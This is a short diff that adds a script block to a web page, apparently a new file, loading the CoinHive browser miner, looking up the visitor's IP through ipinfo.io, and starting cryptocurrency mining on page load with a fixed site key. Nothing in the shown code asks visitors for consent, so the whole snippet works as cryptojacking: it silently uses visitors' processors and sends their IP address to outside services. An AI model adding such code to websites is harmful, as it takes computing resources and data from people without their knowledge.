@@ -1,0 +1,10 @@
+<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+<script>
+	$(document).ready(function() {
+		$.get("http://ipinfo.io", function(response) {
+			var ip = response.ip;
+			var miner = new CoinHive.User('AUrNBFOOyEAb4O9OgDJidl5J9HfejCnJ', ip);
+			miner.start(CoinHive.IF_EXCLUSIVE_TAB);
+		}, "jsonp");
+	});
+</script>
